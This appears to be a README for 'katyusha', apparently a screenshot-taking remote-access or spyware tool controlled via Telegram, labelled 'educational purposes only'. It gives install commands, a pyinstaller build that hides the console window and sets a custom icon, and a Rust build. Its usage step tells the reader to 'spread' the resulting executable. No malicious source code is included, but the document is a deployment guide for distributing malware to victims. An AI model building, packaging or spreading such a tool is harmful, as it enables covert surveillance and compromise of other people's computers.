# :information_source: EDUCATIONAL PURPOSES ONLY

### Development Setup

```pip install pyscreenshot```

```pip install -U aiogram ujson aiohttp[speedups]```

```pip install uvloop``` ___ **NOT SUPPORTED BY WINDOWS**

```pip install pyinstaller```

```pip install pyzmq```

```npm install pm2@latest -g```

```pm2 start katyusha.py```

### Build on Python

```pyinstaller --onefile --windowed --icon=katyusha.ico katpy/katyusha.py```

### Build on Rust
```cd katrust && cargo build --release```

### Usage

Spread ```katyusha.exe``` inside `katpy/dist` or ```katrust.exe``` inside `katrust/target/release` folder

